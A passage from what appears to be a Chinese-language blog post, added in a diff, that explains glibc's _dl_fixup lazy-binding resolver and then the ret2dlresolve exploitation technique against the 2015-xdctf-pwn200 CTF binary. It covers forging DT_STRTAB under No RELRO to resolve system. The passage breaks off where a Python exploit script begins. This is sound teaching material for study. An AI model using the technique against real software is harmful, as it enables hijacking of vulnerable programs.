+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601212109244.png"
+                      class=""
+                >
+<p>我们可以定位到2.27glibc源码进行查看，**_dl_runtime_resolve<strong>位置在</strong>sysdeps/x86_64/dl-trampline.h<strong>中。而</strong>_dl_fixup<strong>在</strong>elf/dl-runtime.c<strong>中。这里我们主要看</strong>_dl_fixup**实现。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">	   <span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;</span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="type">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">	    (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    version = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">	 not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">	 we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	&#123;</span><br><span class="line">	  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">	  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">	 of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">	 offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">				   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">					  + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">	 address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<h3 id="dl_fixup处理过程">dl_fixup处理过程</h3>
+<p>我们一步一步来分析具体做了什么。首先看一下传进来的参数是什么。</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">	   <span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li><code>l</code> 是调用者所在的
+<code>link_map</code>，记录该动态库或可执行文件的加载信息。</li>
+<li><code>reloc_arg</code> 是重定位槽编号（PLT entry
+编号），用于查找具体哪个函数需要绑定。</li>
+</ul>
+<p>然后看看<strong>link_map</strong>是一个什么样的结构</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ElfW(Addr) l_addr;   <span class="comment">// 当前对象在内存中实际加载地址与它的ELF文件中指定地址的差值（即重定位偏移）</span></span><br><span class="line">  <span class="type">char</span> *l_name;        <span class="comment">// 当前共享对象的文件名（绝对路径）</span></span><br><span class="line">  ElfW(Dyn) *l_ld;     <span class="comment">// 指向该对象的动态段（.dynamic section），里面包含了所有动态链接的信息</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">// 链表指针，指向加载链中的前一个和下一个 link_map</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+<p>调试时看到的对应结构体远比上面的结构体定义复杂，不过前几个字段还是对的上的，发现第一个next域指的很近，实际使两个link_map重叠了。我们可以跟着next域打印几个<strong>link_map</strong>链表结点看看。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601215505916.png"
+                      class=""
+                >
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601220205529.png"
+                      class=""
+                >
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601220301045.png"
+                      class=""
+                >
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601220338216.png"
+                      class=""
+                >
+<p>看的出来<strong>link_map</strong>串联起了多个动态链接库。</p>
+<p><code>ElfW(type)</code> 是用于处理 <strong>32位与64位 ELF
+兼容性</strong> 的一个 GNU-style
+宏技巧，它可以根据目标架构自动选择正确的类型。</p>
+<p>先看这些宏的定义顺序：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ElfW(type)        _ElfW (Elf, __ELF_NATIVE_CLASS, type)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ElfW(e,w,t)      _ElfW_1 (e, w, _##t)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ElfW_1(e,w,t)    e##w##t</span></span><br></pre></td></tr></table></figure></div>
+<p>再看变量 <code>__ELF_NATIVE_CLASS</code> 的含义：</p>
+<ul>
+<li><code>__ELF_NATIVE_CLASS</code> 在 32 位系统上为
+<code>32</code></li>
+<li>在 64 位系统上为 <code>64</code></li>
+</ul>
+<p>所以：</p>
+<p>比如 <code>ElfW(Addr)</code> 会被展开为如下过程（以 64 位为例）：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Addr)</span><br><span class="line">-&gt; _ElfW(Elf, <span class="number">64</span>, Addr)</span><br><span class="line">-&gt; _ElfW_1(Elf, <span class="number">64</span>, _Addr)</span><br><span class="line">-&gt; Elf64_Addr</span><br></pre></td></tr></table></figure></div>
+<table>
+<thead>
+<tr>
+<th>宏调用</th>
+<th>展开结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ElfW(Addr)</code></td>
+<td><code>Elf32_Addr</code>（32位）或
+<code>Elf64_Addr</code>（64位）</td>
+</tr>
+<tr>
+<td><code>ElfW(Sym)</code></td>
+<td><code>Elf64_Sym</code></td>
+</tr>
+<tr>
+<td><code>ElfW(Dyn)</code></td>
+<td><code>Elf64_Dyn</code></td>
+</tr>
+<tr>
+<td><code>ElfW(Half)</code></td>
+<td><code>Elf64_Half</code></td>
+</tr>
+</tbody>
+</table>
+<p>而在<strong>elf/elf.h</strong>中，我们就可以看到<strong>Elf64_Addr</strong>实际就是一个64位的无符号整型。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601214457631.png"
+                      class=""
+                >
+<p>Dyn的这个结构体占16字节</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601214706199.png"
+                      class=""
+                >
+<h4 id="获取符号表与字符串表">1. 获取符号表与字符串表</h4>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li><code>symtab</code>：符号表指针，保存函数名和地址等信息。</li>
+<li><code>strtab</code>：字符串表指针，保存符号名字符串（比如
+<code>"printf"</code>）。</li>
+</ul>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601223442507.png"
+                      class=""
+                >
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601223513590.png"
+                      class=""
+                >
+<h4 id="获取当前重定位项">2. 获取当前重定位项</h4>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> PLTREL *<span class="type">const</span> reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li><code>DT_JMPREL</code>：保存 <code>.rel.plt</code> 表的位置；</li>
+<li><code>reloc_offset</code> 是根据 <code>reloc_arg</code>
+算出来的；</li>
+<li><code>reloc</code>：指向当前 PLT 的重定位项。</li>
+</ul>
+<p>从上图也可以看到通过基址加偏移的方式计算出了<strong>read
+got</strong>的重定位表项地址</p>
+<h4 id="获取符号项和地址">3. 获取符号项和地址</h4>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li><code>reloc-&gt;r_info</code> 里面编码了符号索引；</li>
+<li><code>sym</code> 是要绑定的符号（比如 <code>printf</code>）；</li>
+<li><code>rel_addr</code> 是 GOT
+中的地址，即我们需要写入“真正函数地址”的地方。</li>
+</ul>
+<h4 id="断言必须是-plt-重定位">4. 断言：必须是 PLT 重定位</h4>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>只处理 <code>JMP_SLOT</code> 类型（即跳转槽），其他如
+<code>RELATIVE</code> 等不由 <code>_dl_fixup</code> 处理。</li>
+</ul>
+<h4 id="判断符号是否可见并查找真实地址">5.
+判断符号是否可见并查找真实地址</h4>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ELFW(ST_VISIBILITY) (sym-&gt;st_other) == <span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>如果符号是默认可见（即不是 hidden），则进行全局符号查找：</li>
+</ul>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>查找流程包括版本信息、作用域锁等；</li>
+<li><code>result</code> 是找到该符号所在的 <code>link_map</code>；</li>
+<li><code>sym-&gt;st_value</code> 是符号在该库内的偏移，加上
+<code>result</code> 的基地址就是最终地址。</li>
+</ul>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601224334477.png"
+                      class=""
+                >
+<p>执行完后rax为<strong>0x7ffff7ff4000</strong>，刚好是之前<strong>libc.so.6</strong>那个<strong>link_map</strong>的地址。</p>
+<h4 id="查询出具体函数的地址">6. 查询出具体函数的地址</h4>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DL_FIXUP_MAKE_VALUE(map, addr) (addr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOOKUP_VALUE_ADDRESS(map) ((map) ? (map)-&gt;l_addr : 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">	 of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">	 offset.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">				   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">					  + sym-&gt;st_value) : <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>
+<p>如果 <code>sym</code> 存在，就计算：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value = l_addr + sym-&gt;st_value;</span><br></pre></td></tr></table></figure></div>
+<p>这里的l_addr是libc在库中的偏移，也就是说这个是<strong>libc_base</strong>，那么<strong>value</strong>也就是：符号的真实内存地址</p>
+<p>否则：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value = DL_FIXUP_MAKE_VALUE(result, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>
+<p>即符号未找到，回传 0。</p>
+<p>从pwndbg中可以很清楚看到read函数的实际地址已经被计算出来了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601225909654.png"
+                      class=""
+                >
+<h4 id="修正值考虑架构的特殊处理">7. 修正值：考虑架构的特殊处理</h4>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> elf_machine_plt_value(map, reloc, value) (value)</span></span><br><span class="line">value = elf_machine_plt_value (l, reloc, value);</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>某些架构需要对地址进行调整（如加偏移、修正格式）；</li>
+</ul>
+<h4 id="ifunc-处理间接函数">8. IFUNC 处理（间接函数）</h4>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (sym &amp;&amp; STT_GNU_IFUNC) &#123;</span><br><span class="line">    value = elf_ifunc_invoke(...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li>如果符号类型是
+<code>GNU_IFUNC</code>（间接函数），则先调用解析函数获得真实地址。</li>
+</ul>
+<h4 id="写回-got-表用于后续直接跳转">9. 写回 GOT
+表（用于后续直接跳转）</h4>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt(l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line"></span><br><span class="line">elf_machine_fixup_plt (<span class="keyword">struct</span> link_map *<span class="built_in">map</span>, <span class="type">lookup_t</span> t,</span><br><span class="line">		       <span class="type">const</span> ElfW(Sym) *refsym, <span class="type">const</span> ElfW(Sym) *sym,</span><br><span class="line">		       <span class="type">const</span> ElfW(Rela) *reloc,</span><br><span class="line">		       ElfW(Addr) *reloc_addr, ElfW(Addr) value)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *reloc_addr = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li><code>dl_bind_not</code>
+表示是否跳过写回（某些情况会保留懒绑定）；</li>
+<li>否则会调用 <code>elf_machine_fixup_plt()</code> 把
+<code>value</code> 写入 <code>GOT</code> 中的
+<code>rel_addr</code>，完成绑定；</li>
+<li>返回 <code>value</code> 给调用方继续执行。</li>
+</ul>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601230147175.png"
+                      class=""
+                >
+<h3 id="ret2dlresolve利用手法">ret2dlresolve利用手法</h3>
+<p>该手法适用于没有 libc 泄露或 info
+leak的情况，但有栈溢出、有任意可控内存写，且已知 <code>plt</code>,
+<code>got</code>, <code>rel.plt</code>
+等节区偏移。本节我们以<strong>2015-xdctf-pwn200</strong>这个例题来学习这一手法。题目漏洞很明显，一个裸的栈溢出。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601234751736.png"
+                      class=""
+                >
+<p>题目里没啥别的控制rdx的gadget，这里可以用ret2csu。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601234933802.png"
+                      class=""
+                >
+<p>三种 RELRO
+模式对比如下，我们在不同的保护模式下利用方式也有所区别，在<strong>Full
+RELRO</strong>下该利用手法就失效了。</p>
+<table>
+<colgroup>
+<col style="width: 22%" />
+<col style="width: 22%" />
+<col style="width: 10%" />
+<col style="width: 44%" />
+</colgroup>
+<thead>
+<tr>
+<th>RELRO 类型</th>
+<th><code>.got.plt</code> 可写性</th>
+<th>攻击难度</th>
+<th>是否启用 lazy binding（延迟绑定）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>No RELRO</strong></td>
+<td>可写</td>
+<td>最低</td>
+<td>开启</td>
+</tr>
+<tr>
+<td><strong>Partial RELRO</strong></td>
+<td><code>.got.plt</code> 可写</td>
+<td>中等</td>
+<td>开启</td>
+</tr>
+<tr>
+<td><strong>Full RELRO</strong></td>
+<td><code>.got.plt</code> 也只读</td>
+<td>最高</td>
+<td>禁用（立即绑定）</td>
+</tr>
+</tbody>
+</table>
+<p>由于寻找libc基址是通过<strong>strtab +
+sym-&gt;st_name</strong>这个函数的名字来查找的</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></div>
+<h4 id="no-relro-64"><strong>No RELRO-64</strong></h4>
+<p>在<strong>DYNAMIC</strong>节中就存着<strong>DT_STRTAB</strong>和<strong>DT_SYMTAB</strong>，分别指向字符名表和符号表。而这个DYNAMIC节在<strong>No
+RELRO</strong>情况下是可写的。那么利用思路就很明确了，可以直接rop链调用read读取内容覆盖<strong>DT_STRTAB</strong>为一个我们可控的地址，然后我们自己在该地址处伪造一个字符表，把目标函数的字符串换成system，最后直接返回到该函数plt表第二个jmp前的push处压id调用**_dl_runtime_resolve**即可。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250601231749750.png"
+                      class=""
+                >
+<p>解析完就可以直接执行system函数了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2025/06/02/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ret2dlresolve/image-20250602003537787.png"
+                      class=""
+                >
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 